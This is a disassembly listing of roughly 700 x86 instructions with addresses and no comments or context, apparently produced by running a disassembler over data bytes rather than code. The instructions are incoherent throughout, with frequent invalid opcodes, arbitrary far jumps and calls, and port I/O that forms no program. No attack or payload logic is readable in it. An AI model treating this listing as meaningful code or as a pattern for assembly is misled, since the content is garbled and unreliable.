  4295fb:	cmp    al,0x2c
  4295fd:	test   al,0xa5
  4295ff:	lock adc BYTE PTR [eax+0xb],ch
  429603:	daa    
  429604:	or     dh,dl
  429606:	aad    0x57
  429608:	jp     0x429683
  42960a:	xor    DWORD PTR [ebp+ecx*1+0x55],esi
  42960e:	ja     0x4295b5
  429610:	cmp    cl,BYTE PTR [esi]
  429612:	jmp    0xaf15:0x280efb02
  429619:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42961a:	xor    DWORD PTR [edx+0x11764ade],ecx
  429620:	(bad)  
  429621:	fidivr DWORD PTR [edx-0xe9758f4]
  429627:	std    
  429628:	mov    cl,0x40
  42962a:	fwait
  42962b:	mov    WORD PTR [esi+0x6b],ss
  42962e:	add    DWORD PTR [esi],ebp
  429630:	aas    
  429631:	pusha  
  429632:	xchg   DWORD PTR [ebx+0x7070c0f0],ecx
  429638:	mov    cl,0x1c
  42963a:	out    0x50,eax
  42963c:	xor    al,0xbf
  42963e:	push   eax
  42963f:	ret    0x5882
	...
  4296b2:	add    BYTE PTR [eax],al
  4296b4:	push   esi
  4296b5:	pop    ebx
  4296b6:	xor    al,0x78
  4296b8:	cmp    eax,0x737f5e7f
  4296bd:	ficom  DWORD PTR [ecx+0x4f]
  4296c0:	js     0x42965a
  4296c2:	jle    0x429666
  4296c4:	(bad)  
  4296c5:	mov    bh,0x1
  4296c7:	add    dh,dh
  4296c9:	add    BYTE PTR [eax],al
  4296cb:	add    BYTE PTR [edx+0x5e],dl
  4296ce:	mov    ds:0x1095744c,al
  4296d3:	xor    al,0x5b
  4296d5:	xchg   ecx,eax
  4296d6:	push   ebp
  4296d7:	not    DWORD PTR [edi-0x3e]
  4296da:	test   al,0x0
  4296dc:	ss cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4296df:	pop    edi
  4296e0:	jle    0x4296a3
  4296e2:	js     0x6a28307
  4296e8:	jns    0x4296c9
  4296ea:	loop   0x4296f3
  4296ec:	loopne 0x42971a
  4296ee:	sbb    DWORD PTR [ecx],edi
  4296f0:	mov    ah,0x62
  4296f2:	(bad)  
  4296f3:	gs loopne 0x429732
  4296f6:	les    ebp,FWORD PTR [eax]
  4296f8:	retf   0xe80d
  4296fb:	les    ecx,FWORD PTR [ebp+0x5c]
  4296fe:	lahf   
  4296ff:	lods   eax,DWORD PTR ds:[esi]
  429700:	adc    al,0xca
  429702:	sub    al,0x2
  429704:	(bad)  
  429705:	cdq    
  429706:	xchg   edi,eax
  429707:	popa   
  429708:	leave  
  429709:	mul    BYTE PTR [edx+0x7eaf8d08]
  42970f:	jae    0x429785
  429711:	jbe    0x429727
  429713:	fcom   QWORD PTR [edx+0x574efd3d]
  429719:	pushf  
  42971a:	daa    
  42971b:	push   edi
  42971c:	test   al,0xfd
  42971e:	pop    ecx
  42971f:	dec    ah
  429721:	adc    eax,ebx
  429723:	retf   0xfffb
  429726:	push   ebp
  429727:	shr    DWORD PTR [edi+0x4c1c80e0],cl
  42972d:	pop    ecx
  42972e:	out    0xd2,al
  429730:	push   ss
  429731:	mov    bl,0x6
  429733:	jle    0x429717
  429735:	mov    edx,0x8409e9d6
  42973a:	test   eax,0xb100cad7
  42973f:	push   ds
  429740:	xchg   ebp,eax
  429741:	pushf  
  429742:	jle    0x429718
  429744:	lea    ebp,[ebp-0x21]
  429747:	out    dx,eax
  429748:	pop    esp
  429749:	ficom  DWORD PTR ds:0x1b0d9616
  42974f:	std    
  429750:	add    eax,0xb8fb96aa
  429755:	scas   al,BYTE PTR es:[edi]
  429756:	iret   
  429757:	(bad)
  42975a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42975b:	jp     0x429722
  42975d:	pushf  
  42975e:	xor    al,0x80
  429760:	inc    ebp
  429761:	dec    edi
  429762:	out    0xe,eax
  429764:	mov    ch,0xad
  429766:	push   0xffffff98
  429768:	xchg   esi,eax
  429769:	jae    0x4297d1
  42976b:	and    al,0x87
  42976d:	das    
  42976e:	sub    DWORD PTR [eax+0x26],0xffffffa4
  429772:	das    
  429773:	mov    cl,0x74
  429775:	rcl    BYTE PTR [eax],cl
  429777:	or     BYTE PTR [edi-0x384e6d18],0x64
  42977e:	ret    0x7581
  429781:	fwait
  429782:	jnp    0x429781
  429784:	lods   eax,DWORD PTR ds:[esi]
  429785:	rol    bh,0x2d
  429788:	add    BYTE PTR [esi+0x565d7eb],dl
  42978e:	pop    es
  42978f:	fist   DWORD PTR [ecx-0x62]
  429792:	push   ds
  429793:	xchg   edx,eax
  429794:	not    BYTE PTR [edi+edx*1]
  429797:	retf   
  429798:	jae    0x429747
  42979a:	arpl   bp,si
  42979c:	mov    edx,ebp
  42979e:	adc    eax,ecx
  4297a0:	cmp    eax,0x22ecffed
  4297a5:	in     al,0x6
  4297a7:	sbb    ebx,DWORD PTR [edx]
  4297a9:	push   es
  4297aa:	iret   
  4297ab:	mov    esp,0x98d27764
  4297b0:	adc    dh,BYTE PTR [ebx+0x10]
  4297b3:	nop
  4297b4:	scas   al,BYTE PTR es:[edi]
  4297b5:	cdq    
  4297b6:	sbb    BYTE PTR [eax-0x46],bl
  4297b9:	mov    esi,0x7a3bc874
  4297be:	jg     0x429820
  4297c0:	mov    ch,0xd0
	...
  429832:	add    BYTE PTR [eax],al
  429834:	es jp  0x4298a8
  429837:	les    edi,FWORD PTR [ebp-0x31]
  42983a:	mov    bh,0xfa
  42983c:	push   0xffffffa8
  42983e:	push   es
  42983f:	adc    esp,eax
  429841:	call   0x1:0xb8f477ce
  429848:	test   BYTE PTR [eax],0x0
  42984b:	add    cl,ah
  42984d:	dec    ebp
  42984e:	scas   al,BYTE PTR es:[edi]
  42984f:	les    ebp,FWORD PTR [edi-0x67ab98e9]
  429855:	mov    esp,0x9cd3eb62
  42985a:	ss call 0xb78f50fb
  429860:	sbb    DWORD PTR [ebx],esi
  429862:	daa    
  429863:	repz stc 
  429865:	int3   
  429866:	jl     0x429826
  429868:	fild   DWORD PTR [eax+0x2c82d279]
  42986e:	sbb    ebp,DWORD PTR [ebx]
  429870:	pop    esi
  429871:	cwde   
  429872:	ret    0x3208
  429875:	out    dx,al
  429876:	lods   al,BYTE PTR ds:[esi]
  429877:	xchg   edi,eax
  429878:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429879:	xlat   BYTE PTR ds:[ebx]
  42987a:	fdiv   QWORD PTR gs:[edx-0x7e]
  42987e:	lea    eax,[ecx+0x4f]
  429881:	xor    BYTE PTR [ecx],al
  429883:	xchg   ecx,eax
  429884:	push   esi
  429885:	pop    edi
  429886:	xor    DWORD PTR [ebx-0xfd2c8a9],edi
  42988c:	dec    ecx
  42988d:	lods   al,BYTE PTR ds:[esi]
  42988e:	sub    esi,ecx
  429890:	pushf  
  429891:	dec    ebx
  429892:	and    eax,0x91900cfb
  429897:	ds cli 
  429899:	adc    cl,BYTE PTR [eax]
  42989b:	mov    esp,0xc7e59bb7
  4298a0:	call   0xadbe1e5b
  4298a5:	pop    edx
  4298a6:	cmc    
  4298a7:	mov    dl,0x6e
  4298a9:	mov    esi,0x363dc1ab
  4298ae:	das    
  4298af:	fdivr  DWORD PTR [edx+0x3d7b908c]
  4298b5:	jecxz  0x429910
  4298b7:	adc    al,0x5b
  4298b9:	push   esi
  4298ba:	dec    esp
  4298bb:	ret    0x569f
  4298be:	scas   al,BYTE PTR es:[edi]
  4298bf:	jmp    0x4298f0
  4298c1:	dec    eax
  4298c2:	loopne 0x429861
  4298c4:	pusha  
  4298c5:	int3   
  4298c6:	xchg   ebp,eax
  4298c7:	daa    
  4298c8:	scas   al,BYTE PTR es:[edi]
  4298c9:	(bad)  
  4298cb:	push   ecx
  4298cc:	imul   ebx,DWORD PTR [ecx-0x2b],0x44aca58e
  4298d3:	fstp   DWORD PTR [edi+0x2460a643]
  4298d9:	cmp    cl,0x71
  4298dc:	adc    bh,BYTE PTR [eax+ecx*4]
  4298df:	add    ebp,ecx
  4298e1:	mov    edi,0x30697986
  4298e6:	cmp    eax,0xd9db6242
  4298eb:	clc    
  4298ec:	sbb    ebx,edx
  4298ee:	jbe    0x4298e5
  4298f0:	mov    edx,0xe3d48334
  4298f5:	ret    0x6bca
  4298f8:	mov    edi,0xa05fb582
  4298fd:	fld    DWORD PTR [ebp-0x1c6c7998]
  429903:	shr    DWORD PTR [esi],cl
  429905:	data16 (bad) 
  429907:	out    0xdc,al
  429909:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42990a:	(bad)  
  42990b:	out    dx,eax
  42990c:	lds    ecx,FWORD PTR ds:0x9460117b
  429912:	sub    eax,0x6b72328c
  429917:	mov    ebx,0xf8ba8bb5
  42991c:	push   ebp
  42991d:	(bad)  
  42991e:	ss sbb al,0xe9
  429921:	jp     0x429912
  429923:	imul   edx,DWORD PTR [ebx+0x19b01d51],0x61
  42992a:	cmp    al,0x9e
  42992c:	rol    BYTE PTR [edi+0x32],1
  42992f:	call   0xc2d5:0xd1574473
  429936:	mov    WORD PTR [esi+ebx*2-0x746c0932],ds
  42993d:	xor    DWORD PTR [ebx+esi*2+0x60],0x59
	...
  4299b1:	add    BYTE PTR [eax],al
  4299b3:	add    BYTE PTR [ebp+0xc],cl
  4299b6:	clc    
  4299b7:	pop    ebx
  4299b8:	stc    
  4299b9:	(bad)  
  4299ba:	out    dx,eax
  4299bb:	push   ds
  4299bc:	ins    BYTE PTR es:[edi],dx
  4299bd:	xchg   ecx,eax
  4299be:	cld    
  4299bf:	sub    DWORD PTR [esi-0x15473782],esi
  4299c5:	mov    ecx,0xf60001
  4299ca:	add    BYTE PTR [eax],al
  4299cc:	test   BYTE PTR [ebp-0xe1b5742],0xd
  4299d3:	adc    ah,al
  4299d5:	cmp    BYTE PTR [edx],ah
  4299d7:	stos   DWORD PTR es:[edi],eax
  4299d8:	inc    esi
  4299d9:	pop    ecx
  4299da:	out    dx,al
  4299db:	cdq    
  4299dc:	and    DWORD PTR [edi-0x16035d58],ebp
  4299e2:	(bad)  
  4299e4:	loope  0x429a46
  4299e6:	mov    ds:0x8065f6a7,al
  4299eb:	and    bh,bh
  4299ed:	shl    bl,1
  4299ef:	iret   
  4299f0:	jle    0x429a45
  4299f2:	sbb    ebp,eax
  4299f4:	jl     0x429a1c
  4299f6:	imul   eax,DWORD PTR [ebx+0x44],0x817d2939
  4299fd:	mov    ecx,0x35d23062
  429a02:	sbb    eax,ebx
  429a04:	pop    ss
  429a05:	jo     0x429a46
  429a07:	out    dx,eax
  429a08:	popa   
  429a09:	and    BYTE PTR [esi+0x2defe6e7],al
  429a0f:	xlat   BYTE PTR ds:[ebx]
  429a10:	out    dx,eax
  429a11:	dec    edx
  429a12:	das    
  429a13:	lods   eax,DWORD PTR ds:[esi]
  429a14:	les    esp,FWORD PTR [esi]
  429a16:	stos   DWORD PTR es:[edi],eax
  429a17:	push   0x3a7436df
  429a1c:	mov    WORD PTR [edi-0x7f547835],?
  429a22:	mov    cs,WORD PTR [eax+0x2e]
  429a25:	sbb    esi,esi
  429a27:	fcmovnb st,st(3)
  429a29:	addr16 mov bh,0x9e
  429a2c:	push   edi
  429a2d:	enter  0x9dbb,0xea
  429a31:	jmp    0x1702:0xd49ee4a7
  429a38:	adc    al,0xdd
  429a3a:	inc    DWORD PTR [ecx+0x76191ef2]
  429a40:	mov    esi,0xe5ffd77a
  429a45:	sub    eax,0xed22062b
  429a4a:	push   esp
  429a4b:	sbb    DWORD PTR [edi],esi
  429a4d:	ss jmp 0xeedd803a
  429a53:	sbb    ebp,ebp
  429a55:	cs inc eax
  429a57:	je     0x429aa5
  429a59:	push   ebx
  429a5a:	jbe    0x429a9c
  429a5c:	loopne 0x4299e1
  429a5e:	jmp    0x99127f63
  429a63:	daa    
  429a64:	popf   
  429a65:	data16 stos BYTE PTR es:[edi],al
  429a67:	pusha  
  429a68:	fmulp  st(5),st
  429a6a:	fcmovu st,st(2)
  429a6c:	push   eax
  429a6d:	repnz mov gs,WORD PTR [edx-0x23]
  429a71:	mov    WORD PTR [ebp-0xe],ss
  429a74:	nop
  429a75:	fld    st(5)
  429a77:	daa    
  429a78:	ins    BYTE PTR es:[edi],dx
  429a79:	ret    
  429a7a:	call   DWORD PTR [esi-0x6db28135]
  429a80:	or     BYTE PTR [edx],al
  429a82:	mov    bh,0x86
  429a84:	into   
  429a85:	jae    0x429a96
  429a87:	fdecstp 
  429a89:	in     eax,dx
  429a8a:	in     al,dx
  429a8b:	and    al,0xdf
  429a8d:	mov    bl,0x5b
  429a8f:	call   0x21bb:0x9a736a07
  429a96:	hlt    
  429a97:	fstp   QWORD PTR [ebp-0x3b703413]
  429a9d:	jecxz  0x429aa3
  429a9f:	adc    eax,0x8a35b5dd
  429aa4:	lods   al,BYTE PTR ds:[esi]
  429aa5:	cmp    edx,DWORD PTR [esi+0x105c3db5]
  429aab:	jg     0x429b04
  429aad:	pusha  
  429aae:	shl    BYTE PTR [edi-0x3e],1
  429ab1:	cmp    eax,0x13f9f83c
  429ab6:	mov    edi,0xbc60c73c
  429abb:	hlt    
  429abc:	scas   eax,DWORD PTR es:[edi]
  429abd:	lea    edx,[esi+0x4c]
  429ac0:	mov    DWORD PTR [ebp+0x0],esp
	...
  429b33:	add    ch,al
  429b35:	push   ebp
  429b36:	mov    bh,dl
  429b38:	call   0xe133:0xa97ff5ff
  429b3f:	ret    0x294a
  429b42:	arpl   WORD PTR [esi],bx
  429b44:	loopne 0x429b00
  429b46:	add    DWORD PTR [eax],eax
  429b48:	test   BYTE PTR [eax],0x0
  429b4b:	add    BYTE PTR [eax],ch
  429b4d:	test   eax,0x8c2a837b
  429b52:	das    
  429b53:	mov    al,ds:0xe2ec976e
  429b58:	cmp    cl,BYTE PTR [ebp+0x6e204ee3]
  429b5e:	call   0xe802:0x1697b6fb
  429b65:	jl     0x429ba3
  429b67:	das    
  429b68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429b69:	js     0x429afe
  429b6b:	repnz or al,0x37
  429b6e:	lds    edi,FWORD PTR [ecx-0x19e3a240]
  429b74:	ja     0x429b6f
  429b76:	cmp    al,0x3f
  429b78:	hlt    
  429b79:	rol    BYTE PTR [edx+0x539f6b63],1
  429b7f:	inc    ecx
  429b80:	sub    eax,0x1d1faca4
  429b85:	push   ds
  429b86:	cmp    edx,DWORD PTR [edi+0x12a807e8]
  429b8c:	push   esi
  429b8d:	xor    edi,DWORD PTR [ecx+eax*4-0x46bdca86]
  429b94:	or     al,bl
  429b96:	mov    ebx,0xd21ec66e
  429b9b:	sahf   
  429b9c:	push   DWORD PTR [ecx]
  429b9e:	mov    WORD PTR ds:[ebx+0x19],es
  429ba2:	add    eax,0xa073fd6d
  429ba7:	sub    DWORD PTR [edx],esp
  429ba9:	sub    bh,BYTE PTR [ebp-0xf]
  429bac:	in     eax,dx
  429bad:	or     edi,esp
  429baf:	xchg   DWORD PTR [ecx],esi
  429bb1:	je     0x429be1
  429bb3:	jo     0x429b98
  429bb5:	(bad)  
  429bb6:	outs   dx,DWORD PTR ds:[esi]
  429bb7:	mov    dl,0xc4
  429bb9:	pop    eax
  429bba:	mov    ebx,0xe19c093e
  429bbf:	xchg   eax,ebp
  429bc1:	xchg   esi,eax
  429bc2:	lds    ebp,FWORD PTR [esi-0x37ee33d9]
  429bc8:	ins    BYTE PTR es:[edi],dx
  429bc9:	lock scas eax,DWORD PTR es:[edi]
  429bcb:	scas   al,BYTE PTR es:[edi]
  429bcc:	js     0x429bb6
  429bce:	aad    0x1d
  429bd0:	add    DWORD PTR [edx+0x18],esi
  429bd3:	div    DWORD PTR [edi]
  429bd5:	dec    BYTE PTR es:[eax-0x5fe7e59c]
  429bdc:	retfw  
  429bde:	imul   edx,DWORD PTR [ecx+0x15],0xcfd131a5
  429be5:	jecxz  0x429bfe
  429be7:	mov    ds:0x2a295c5c,eax
  429bec:	clc    
  429bed:	gs jb  0x429b70
  429bf0:	xchg   ebx,eax
  429bf1:	hlt    
  429bf2:	sub    eax,0xeffbdffb
  429bf7:	cmp    al,0x7
  429bf9:	jb     0x429ba9
  429bfb:	inc    edx
  429bfc:	mov    al,0xa1
  429bfe:	jl     0x429b96
  429c00:	mov    eax,ds:0x804be606
  429c05:	or     eax,0x1e15c0d
  429c0a:	test   BYTE PTR [edx-0x123151d8],al
  429c10:	and    BYTE PTR [edx-0x28],dh
  429c13:	pop    es
  429c14:	dec    BYTE PTR [edi]
  429c16:	mov    ds:0x4b960a0,al
  429c1b:	cmp    al,0xe4
  429c1d:	jo     0x429bf4
  429c1f:	scas   eax,DWORD PTR es:[edi]
  429c20:	aad    0x78
  429c22:	mov    ecx,0xa7767bae
  429c27:	aas    
  429c28:	xchg   ecx,eax
  429c29:	ins    BYTE PTR es:[edi],dx
  429c2a:	adc    BYTE PTR [ebp-0x59eeb1c6],ch
  429c30:	div    esp
  429c32:	mov    dl,cl
  429c34:	cmp    dh,dh
  429c36:	push   si
  429c38:	jmp    0x429ca5
  429c3a:	mov    dl,0xd8
  429c3c:	mov    ecx,DWORD PTR [esi-0x42c00175]
	...
  429cb2:	add    BYTE PTR [eax],al
  429cb4:	xor    DWORD PTR [ebp+0x75f531f1],0xd7dfb5c1
  429cbe:	ins    BYTE PTR es:[edi],dx
  429cbf:	scas   al,BYTE PTR es:[edi]
  429cc0:	pop    eax
  429cc1:	xchg   BYTE PTR [esi+0x1bbd616],ch
  429cc7:	add    dh,dh
  429cc9:	add    BYTE PTR [eax],al
  429ccb:	add    BYTE PTR [eax],cl
  429ccd:	inc    ebp
  429cce:	fnstenv [edx-0x53]
  429cd1:	fisub  WORD PTR [edx]
  429cd3:	mov    ebx,0x7beaeeab
  429cd8:	jmp    0x433d:0x1dff08b6
  429cdf:	xchg   esp,eax
  429ce0:	mov    edx,0x820dd4a1
  429ce5:	and    eax,0xdc31b933
  429cea:	fadd   QWORD PTR [ecx-0x63bd303a]
  429cf0:	stos   DWORD PTR es:[edi],eax
  429cf1:	or     BYTE PTR [ebp-0x7793cf07],dl
  429cf7:	inc    ecx
  429cf8:	imul   ebx,DWORD PTR [edi],0xffffffab
  429cfb:	push   edx
  429cfc:	cmp    eax,0x50bfb45d
  429d01:	outs   dx,DWORD PTR ds:[esi]
  429d02:	stc    
  429d03:	inc    ebp
  429d04:	(bad)  
  429d06:	ret    
  429d07:	pop    ecx
  429d08:	mov    edx,0x9c43902d
  429d0d:	out    dx,eax
  429d0e:	cmp    DWORD PTR [eax-0x64d3779],edx
  429d14:	jmp    0x429d0c
  429d16:	mov    ds:0xc6fa89a3,eax
  429d1b:	xchg   esi,eax
  429d1c:	fucomip st,st(0)
  429d1e:	mov    dl,0x36
  429d20:	add    esi,eax
  429d22:	push   esi
  429d23:	lds    edi,FWORD PTR [ecx]
  429d25:	pop    ebx
  429d26:	xor    bh,ah
  429d28:	cmp    DWORD PTR [edx+0x3],ebx
  429d2b:	dec    ebx
  429d2c:	iret   
  429d2d:	and    eax,esi
  429d2f:	ins    BYTE PTR es:[edi],dx
  429d30:	data16 (bad) 
  429d32:	xchg   edx,eax
  429d33:	sar    BYTE PTR [edx],1
  429d35:	lds    esi,FWORD PTR [edi*2-0x384c569b]
  429d3c:	jp     0x429d20
  429d3e:	pop    esp
  429d3f:	jb     0x429d41
  429d41:	sahf   
  429d42:	pop    ebx
  429d43:	push   ss
  429d44:	sub    BYTE PTR [eax],cl
  429d46:	dec    eax
  429d47:	loop   0x429d1a
  429d49:	pushf  
  429d4a:	xor    BYTE PTR [edi+0x78c36e4d],bh
  429d50:	lahf   
  429d51:	fs dec eax
  429d53:	adc    BYTE PTR [esi+0xf],bl
  429d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429d57:	mov    ds:0x9e4c283,al
  429d5c:	cmp    al,0xbe
  429d5e:	and    bl,BYTE PTR [edx-0x46400675]
  429d64:	bound  ecx,QWORD PTR [eax+0x3a148082]
  429d6a:	jg     0x429d65
  429d6c:	ds int3 
  429d6e:	mov    ecx,0xd24c78a0
  429d73:	and    eax,DWORD PTR [ebx+0x76]
  429d76:	rcl    DWORD PTR [ecx],cl
  429d78:	lods   eax,DWORD PTR ds:[esi]
  429d79:	xor    edi,DWORD PTR [esi]
  429d7b:	sbb    dh,BYTE PTR [ebx-0x5]
  429d7e:	aas    
  429d7f:	out    dx,al
  429d80:	(bad)  
  429d81:	push   eax
  429d82:	rcl    ebx,cl
  429d84:	fwait
  429d85:	icebp  
  429d86:	pop    es
  429d87:	loop   0x429d8f
  429d89:	mov    edi,0xc39f7990
  429d8e:	(bad)  
  429d90:	fisub  DWORD PTR [eax-0x4c]
  429d93:	jg     0x429daf
  429d95:	imul   esp,ebx,0xe9e8059d
  429d9b:	and    BYTE PTR [edx-0xcecf141],ch
  429da1:	adc    eax,0xfd19e199
  429da6:	repnz xchg ecx,eax
  429da8:	cmp    edx,DWORD PTR [edi+0x315172a9]
  429dae:	scas   al,BYTE PTR es:[edi]
  429daf:	mov    bl,0x51
  429db1:	stc    
  429db2:	or     eax,DWORD PTR [ecx-0x4c]
  429db5:	out    dx,eax
  429db6:	pushf  
  429db7:	dec    esp
  429db8:	ja     0x429ded
  429dba:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  429dbc:	dec    edx
  429dbd:	addr16 mov al,ds:0x16cd
  429dc1:	jecxz  0x429dc3
	...
  429e33:	add    BYTE PTR [edi+0x5d],cl
  429e36:	pop    ecx
  429e37:	sbb    DWORD PTR [ebx-0x79],0xffffffdf
  429e3b:	fstp   QWORD PTR [eax-0x21b1d120]
  429e41:	imul   dl
  429e43:	dec    ecx
  429e44:	int3   
  429e45:	mov    esp,0xf60001
  429e4a:	add    BYTE PTR [eax],al
  429e4c:	mov    esi,DWORD PTR [ebx-0x244713c2]
  429e52:	push   es
  429e53:	in     al,0x7d
  429e55:	jns    0x429dfa
  429e57:	jno    0x429e1a
  429e59:	xor    ebp,DWORD PTR [ebx-0x5a1c87d7]
  429e5f:	dec    edx
  429e60:	cmpxchg esi,ebp
  429e63:	inc    ebx
  429e64:	call   0x1386:0xe8b95b48
  429e6b:	mov    al,ds:0x186193f5
  429e70:	ins    DWORD PTR es:[edi],dx
  429e71:	stos   BYTE PTR es:[edi],al
  429e72:	(bad)  
  429e73:	and    ebp,DWORD PTR [edx-0x6f]
  429e76:	mov    WORD PTR [esi+edx*8-0x4831d3b3],fs
  429e7d:	lock lds ecx,FWORD PTR [eax-0x65ae3ba7]
  429e84:	shl    DWORD PTR [esi+0x6b6e40cd],0xa3
  429e8b:	cmp    al,0xef
  429e8d:	pushf  
  429e8e:	jecxz  0x429e21
  429e90:	clc    
  429e91:	js     0x429e73
  429e93:	jge    0x429e43
  429e95:	inc    ebp
  429e96:	retf   
  429e97:	sbb    BYTE PTR [ebx-0x18810fc8],bh
  429e9d:	mov    ecx,0xec41bb01
  429ea2:	sub    BYTE PTR [esi],ch
  429ea4:	sbb    DWORD PTR ds:0xfadba51b,0x4c105252
  429eae:	lock cld 
  429eb0:	push   esi
  429eb1:	fnsave [ecx-0x401293c]
  429eb7:	hlt    
  429eb8:	xor    BYTE PTR [ebx],dl
  429eba:	aad    0x1c
  429ebc:	jg     0x429e6f
  429ebe:	mov    ds:0x8335396a,eax
  429ec3:	inc    esi
  429ec4:	push   ecx
  429ec5:	inc    esi
  429ec6:	js     0x429e75
  429ec8:	add    cl,BYTE PTR [esi+0x7b7b3a73]
  429ece:	(bad)  
  429ecf:	and    bh,bh
  429ed1:	sbb    DWORD PTR [esp+eax*8+0x77],0xffffff92
  429ed6:	jl     0x429e85
  429ed8:	aas    
  429ed9:	xchg   ebp,eax
  429eda:	js     0x429ed5
  429edc:	pop    ebp
  429edd:	add    cl,bl
  429edf:	cmc    
  429ee0:	jg     0x429e9b
  429ee2:	jnp    0x429ead
  429ee4:	push   ds
  429ee5:	imul   ecx,DWORD PTR [ecx-0x46ef93e8],0xffffffd7
  429eec:	dec    esi
  429eed:	(bad)  [eax+0x1fc36510]
  429ef3:	in     al,0x32
  429ef5:	outs   dx,DWORD PTR ds:[esi]
  429ef6:	scas   eax,DWORD PTR es:[edi]
  429ef7:	cli    
  429ef8:	(bad)  
  429ef9:	inc    BYTE PTR [ebx+0x4b3d67db]
  429eff:	loope  0x429f7c
  429f01:	or     BYTE PTR [ebx-0x1d],bl
  429f04:	or     BYTE PTR [eax],0x9d
  429f07:	cld    
  429f08:	mov    ecx,gs
  429f0a:	pop    ss
  429f0b:	sbb    DWORD PTR [ebp+esi*8-0x4269e961],0xc214dacb
  429f16:	pusha  
  429f17:	dec    edi
  429f18:	sub    al,0x42
  429f1a:	sti    
  429f1b:	mov    al,ds:0x10628ab
  429f20:	pop    edx
  429f21:	pop    ebp
  429f22:	(bad)  
  429f24:	push   ss
  429f25:	pop    ss
  429f26:	lods   eax,DWORD PTR ds:[esi]
  429f27:	test   eax,0x86c2b381
  429f2c:	push   es
  429f2d:	and    DWORD PTR [ecx-0x224575b4],ebp
  429f33:	push   eax
  429f34:	in     al,dx
  429f35:	pop    DWORD PTR fs:[ebx]
  429f38:	xchg   edx,eax
  429f39:	pop    esi
  429f3a:	xchg   esi,eax
  429f3b:	mov    ds:0xb798bdda,eax
  429f40:	lods   eax,DWORD PTR ds:[esi]
  429f41:	add    BYTE PTR es:[eax],al
	...
  429fb4:	loope  0x429fa2
  429fb6:	mov    ebx,es
  429fb8:	(bad)  
  429fb9:	jecxz  0x429faa
  429fbb:	out    dx,al
  429fbc:	sub    dh,BYTE PTR [eax+0x6b716d7b]
  429fc2:	mov    ah,0x3a
  429fc4:	ret    0x1bd
  429fc7:	add    dh,dh
  429fc9:	add    BYTE PTR [eax],al
  429fcb:	add    BYTE PTR [ebx-0x10cf56ed],dh
  429fd1:	(bad)  
  429fd2:	and    DWORD PTR [esi],esi
  429fd4:	sbb    al,cl
  429fd6:	jmp    0x8682:0x897cb017
  429fdd:	sti    
  429fde:	pop    eax
  429fdf:	dec    edi
  429fe0:	(bad)  
  429fe2:	push   ebp
  429fe3:	inc    edi
  429fe4:	push   ss
  429fe5:	dec    esi
  429fe6:	jge    0x42a03b
  429fe8:	xor    BYTE PTR [esi+edx*8-0x5e],dl
  429fec:	xor    dl,ah
  429fee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fef:	mov    esi,0x2c4a43a5
  429ff4:	sub    ebx,DWORD PTR [edi+0x78]
  429ff7:	dec    ebp
  429ff8:	push   ecx
  429ff9:	shl    BYTE PTR [eax],0xd4
  429ffc:	arpl   WORD PTR ds:0x79a7a9d8,bx
  42a002:	fs push edi
  42a004:	imul   ebx,esp,0x12
  42a007:	adc    ecx,esp
  42a009:	adc    BYTE PTR [edx+0x6d2866a6],0x90
  42a010:	das    
  42a011:	sub    edi,DWORD PTR [eax]
  42a013:	inc    ebp
  42a014:	and    al,0x62
  42a016:	push   ds
  42a017:	lds    eax,FWORD PTR [eax+0x3d]
  42a01a:	popf   
  42a01b:	sbb    eax,0xc9ac6222
  42a020:	push   ebx
  42a021:	imul   ebp,edx,0x34ee60e
  42a027:	add    esi,DWORD PTR [ecx]
  42a029:	dec    esi
  42a02a:	in     eax,dx
  42a02b:	pop    edi
  42a02c:	jne    0x42a0a1
  42a02e:	or     BYTE PTR [eax+eiz*1-0x72857421],ch
  42a035:	mov    edi,0x6195d700
  42a03a:	int3   
  42a03b:	xchg   ebx,eax
  42a03c:	mov    edx,0x3bbbeb27
  42a041:	ins    DWORD PTR es:[edi],dx
  42a042:	out    0xdb,al
  42a044:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a045:	or     BYTE PTR [edx],cl
  42a047:	fcomp  st(6)
  42a049:	ins    DWORD PTR es:[edi],dx
  42a04a:	test   eax,0xd1e1f3a7
  42a04f:	int3   
  42a050:	cld    
  42a051:	sub    DWORD PTR [eax+0x1ee8638d],ecx
  42a057:	sbb    al,0xcf
  42a05a:	les    edi,FWORD PTR [edx+edi*4-0x5e]
  42a05e:	int3   
  42a05f:	(bad)  
  42a060:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a061:	cld    
  42a062:	out    dx,al
  42a063:	ss gs mov edi,0x3d8aa71c
  42a06a:	xchg   BYTE PTR [edx+0x2166df3d],dl
  42a070:	imul   esp,DWORD PTR [esi+0x32c14839],0x10
  42a077:	jge    0x42a02d
  42a079:	or     al,0xee
  42a07b:	dec    ebx
  42a07c:	nop
  42a07d:	shl    DWORD PTR [eax],1
  42a07f:	mov    bl,0xe9
  42a081:	stos   BYTE PTR es:[edi],al
  42a082:	jmp    0x42a086
  42a084:	out    dx,al
  42a085:	and    BYTE PTR [edx-0x4c25623b],al
  42a08b:	xor    al,BYTE PTR [ebp-0x27943869]
  42a091:	and    ebx,DWORD PTR [esi+edi*2-0x752e0dee]
  42a098:	pop    edi
  42a099:	mov    dh,BYTE PTR [ecx]
  42a09b:	jbe    0x42a04d
  42a09d:	or     DWORD PTR [ebx+eiz*4],0xd8e3d388
  42a0a4:	pusha  
  42a0a5:	push   ecx
  42a0a6:	xchg   ecx,eax
  42a0a7:	pop    esp
  42a0a8:	cmp    eax,0x9b7b69a7
  42a0ad:	outs   dx,DWORD PTR ds:[esi]
  42a0ae:	adc    edx,DWORD PTR [edx-0x65682332]
  42a0b4:	call   0x489b2c8e
  42a0b9:	icebp  
  42a0ba:	dec    esp
  42a0bb:	sub    DWORD PTR [edi],edx
  42a0bd:	xchg   edx,eax
  42a0be:	mov    edx,0x1aae63
	...
  42a133:	add    BYTE PTR [esi-0x79],dl
  42a136:	std    
  42a137:	test   ch,bh
  42a139:	(bad)  
  42a13a:	jg     0x42a113
  42a13c:	jbe    0x42a105
